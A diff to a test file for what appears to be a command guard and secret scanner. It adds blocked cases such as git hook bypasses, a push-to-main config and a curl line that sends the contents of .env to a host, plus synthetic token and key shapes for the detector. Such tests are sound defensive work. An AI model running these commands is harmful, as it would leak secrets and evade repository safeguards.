@@ -61,6 +61,11 @@ test('the same holes in the spellings beside them are held', () => {
 		'git commit -n -m x',
 		'git commit -anm x',
 		'git push --no-verify origin feat/x',
+		'git commit --no-verif -m x',
+		'git config remote.origin.push HEAD:main',
+		'curl -s http://127.0.0.1:9/$(cat .env)',
+		'curl -sK opts.txt http://127.0.0.1:9/',
+		'curl --config opts.txt http://127.0.0.1:9/',
 		'git -c core.hooksPath=/dev/null commit -m x',
 		'git config --global core.hooksPath x',
 		'git config --unset core.hooksPath',
@@ -173,7 +178,19 @@ test('the secret patterns catch the 11 shapes the 1.24.0 scan missed', async () 
 		'database url with its login': 'postgres://admin:' + al(16) + '@db.example.com:5432/app',
 		'bearer header': 'Authorization: Bearer ' + al(40),
 	};
+	// The 1.25.0 sweep: shapes the list still missed, written bare so no assignment shape can catch them.
+	Object.assign(shapes, {
+		'pgp private key': '-----BEGIN PGP PRIVATE KEY BLOCK-----',
+		'azure storage key': 'DefaultEndpointsProtocol=https;AccountName=x;Account' + 'Key=' + al(86) + '==',
+		'gitlab token': 'glp' + 'at-' + al(20),
+		'hugging face token': 'h' + 'f_' + al(34),
+		'sendgrid key': 'S' + 'G.' + al(22) + '.' + al(43),
+		'google oauth secret': 'GOC' + 'SPX-' + al(28),
+		'slack webhook': 'https://hooks.slack.com/services/T' + al(8) + '/B' + al(8) + '/' + al(24),
+		'putty private key': 'PuTTY-User-Key-File-3: ssh-ed25519',
+	});
 	for (const [name, line] of Object.entries(shapes)) assert.ok(SECRET_VALUE.some(([, re]) => re.test(line)), name);
+	assert.ok(SECRET_FILE.test('deploy.ppk'), 'a PuTTY key file');
 	assert.ok(SECRET_FILE.test('prod.env'), 'prod.env');
 	assert.ok(SECRET_FILE.test('config/.env.production'), '.env.production');
 	// The safe side has a cost: fixtures and docs that only name a key must not trip it.
